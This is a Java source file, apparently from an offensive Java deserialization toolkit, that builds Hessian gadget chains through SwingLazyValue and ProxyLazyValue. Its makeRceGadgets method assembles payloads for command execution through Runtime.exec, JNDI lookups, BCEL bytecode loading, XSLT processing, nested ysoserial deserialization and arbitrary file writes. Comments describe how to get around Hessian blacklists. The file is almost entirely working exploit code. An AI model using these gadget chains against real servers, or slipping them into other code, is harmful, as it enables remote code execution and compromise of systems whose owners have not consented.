package cn.butler.hessian.util;

import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.yso.Serializer;
import cn.butler.yso.payloads.util.CommonUtil;
import cn.butler.yso.payloads.util.Reflections;
import com.fasterxml.jackson.databind.node.POJONode;
import me.gv7.woodpecker.bcel.HackBCELs;
import sun.reflect.misc.MethodUtil;
import sun.security.pkcs.PKCS9Attribute;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.lang.reflect.Method;

public class Gadgets {
    public static UIDefaults makeRceGadgetsLazyValueTrigger(String command) throws Exception {
        String[] parts  = command.split(":", 2); //使用第一个冒号进行切割，限制切割为最多两个部分
        //LazyValue Rce触发对象构造
        boolean isSwingLazyValue = false;
        if(parts[0].equals("SwingLazyValue")){
            isSwingLazyValue = true;
        }
        Object[] rceGadgets = makeRceGadgets(parts[1],isSwingLazyValue);
        //SwingLazyValue或者ProxyLazyValue对象构造
        if(parts[0].equals("SwingLazyValue")){
            UIDefaults uiDefaults = new UIDefaults();
            uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue((String) rceGadgets[0], (String) rceGadgets[1], (Object[]) rceGadgets[2]));
            return uiDefaults;
        }else if(parts[0].equals("ProxyLazyValue")){
            UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue((String) rceGadgets[0], (String) rceGadgets[1], (Object[]) rceGadgets[2]);
            Reflections.setFieldValue(proxyLazyValue,"acc",null);
            UIDefaults uiDefaults = new UIDefaults();
            uiDefaults.put("key", proxyLazyValue);
            return uiDefaults;
        }else {
            return null;
        }
    }

    /**
     * UIDefaults后续利用链SwingLazyValue/ProxyLazyValue,用于HashMap的equals方法来触发
     * @param command
     * @return
     */
    public static Object makeLazyValueRceGadgets(String command) throws Exception {
        String[] parts  = command.split(":", 2); //使用第一个冒号进行切割，限制切割为最多两个部分
        //LazyValue Rce触发对象构造
        boolean isSwingLazyValue = false;
        if(parts[0].equals("SwingLazyValue")){
            isSwingLazyValue = true;
        }
        Object[] rceGadgets = makeRceGadgets(parts[1],isSwingLazyValue);
        //SwingLazyValue或者ProxyLazyValue对象构造
        if(parts[0].equals("SwingLazyValue")){
            SwingLazyValue swingLazyValue = new SwingLazyValue((String) rceGadgets[0], (String) rceGadgets[1], (Object[]) rceGadgets[2]);
            return swingLazyValue;
        }else if(parts[0].equals("ProxyLazyValue")){
            UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue((String) rceGadgets[0], (String) rceGadgets[1], (Object[]) rceGadgets[2]);
            Reflections.setFieldValue(proxyLazyValue,"acc",null);
            return proxyLazyValue;
        }else {
            return null;
        }
    }

    private static Object[] makeRceGadgets(String command,boolean isSwingLazyValue) throws Exception {
        String[] parts  = command.split(":", 2); //使用第一个冒号进行切割，限制切割为最多两个部分
        String className;
        String methodName;
        Object[] parameters;
        if(parts[0].equals("ThreadSleep")){
            className = "java.lang.Thread";
            methodName = "sleep";
            Integer sleepTime = Integer.valueOf(parts[1]) * 1000;
            parameters = new Integer[]{sleepTime};
        }else if(parts[0].equals("InetAddress")){
            className = "java.net.InetAddress";
            methodName = "getByName";
            parameters = new String[]{parts[1]};
        }else if(parts[0].equals("SetProperty")){
            className = "java.lang.System";
            methodName = "setProperty";
            String[] split = parts[1].split(":", 2);
            parameters = new String[]{split[0],split[1]};
        }else if (parts[0].equals("jndi")){
            className = "javax.naming.InitialContext";
            methodName = "doLookup";
            parameters = new String[]{parts[1]};
        }else if (parts[0].equals("BCELLoader")){
            className = "com.sun.org.apache.bcel.internal.util.JavaWrapper";
            methodName = "_main";
            String effect = parts[1];
            Object[] objects = (Object []) ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
            objects = (Object []) ClassHandleUtil.modifyJavaWrapperClass((String) objects[0],(byte[]) objects[1]);
            byte[] classByteCode = (byte[]) objects[1];
            String encodeResult = HackBCELs.encode(classByteCode);
            parameters = new Object[]{new String[]{encodeResult}};
        } else if (parts[0].equals("XSTL")) {
            className = "com.sun.org.apache.xalan.internal.xslt.Process";
            methodName = "_main";
            parameters = new Object[]{new String[]{"-XT", "-XSL", parts[1]}};
        } else if (parts[0].equals("RuntimeExec")) {
            Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
            Method exec = Runtime.class.getMethod("exec", String.class);
            className = "sun.reflect.misc.MethodUtil";
            methodName = "invoke";
            //因为有参数是java.lang.Runtime,所以会命中caucho hessian高版本的黑名单会打不通
            parameters = new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{parts[1]}}};
        } else if (parts[0].equals("POJONode")) {
//            Constructor constructor = UnixPrintService.class.getDeclaredConstructor(String.class);
//            constructor.setAccessible(true);
//            UnixPrintService unixPrintService = (UnixPrintService) constructor.newInstance(";open -a Calculator");
            POJONode pojoNode = new POJONode(null);
            Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
            Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
            className = "sun.reflect.misc.MethodUtil";
            methodName = "invoke";
            parameters = new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}};
        } else if (parts[0].equals("SpringCoreDeserialize")) {
            // spring-core 中的 org.springframework.util.SerializationUtils#deserialize
            String ysoGadget = command.substring("SpringCoreDeserialize:".length());
            String[] split = ysoGadget.split(":", 2);
            Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",split[0], split[1]);
            byte[] serialize = Serializer.serialize(object);
            //SwingLazyValue的类加载器只能加载rt.jar中的类,ProxyLazyValue的类从线程上下文中进行类加载。所以针对rt.jar以外的类俩种对象构造方式所有不同
            if(isSwingLazyValue){
                Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
                Method deserializeMethod = org.springframework.util.SerializationUtils.class.getDeclaredMethod("deserialize", byte[].class);
                className = "sun.reflect.misc.MethodUtil";
                methodName = "invoke";
                parameters = new Object[]{invoke, new Object(), new Object[]{deserializeMethod, null, new Object[]{serialize}}};
            }else {
                className = "org.springframework.util.SerializationUtils";
                methodName = "deserialize";
                parameters = new Object[]{serialize};
            }
        } else if (parts[0].equals("CommonsLangDeserialize")) {
            // commons-lang 中的 org.apache.commons.lang.SerializationUtils#deserialize
            String ysoGadget = command.substring("CommonsLangDeserialize:".length());
            String[] split = ysoGadget.split(":", 2);
            Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",split[0], split[1]);
            byte[] serialize = Serializer.serialize(object);
            if(isSwingLazyValue){
                Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
                Method deserializeMethod = org.apache.commons.lang.SerializationUtils.class.getDeclaredMethod("deserialize", byte[].class);
                className = "sun.reflect.misc.MethodUtil";
                methodName = "invoke";
                parameters = new Object[]{invoke, new Object(), new Object[]{deserializeMethod, null, new Object[]{serialize}}};
            }else {
                className = "org.apache.commons.lang.SerializationUtils";
                methodName = "deserialize";
                parameters = new Object[]{serialize};
            }
        } else if (parts[0].equals("JavaUtils")) {
            String sourceAndDest = command.substring("JavaUtils:".length());
            String[] split = sourceAndDest.split("\\|",2);
            byte[] destFileBytes = CommonUtil.getFileBytes(split[0]);
            className = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
            methodName = "writeBytesToFilename";
            parameters = new Object[]{split[1], destFileBytes};
        } else {
            //还有 JavaUtils#writeBytesToFilename+System.load 和 DumpBytecode.dumpBytecode+System.load 但是比较麻烦先不整理了
            return null;
        }
        return new Object[]{className,methodName,parameters};
    }
}
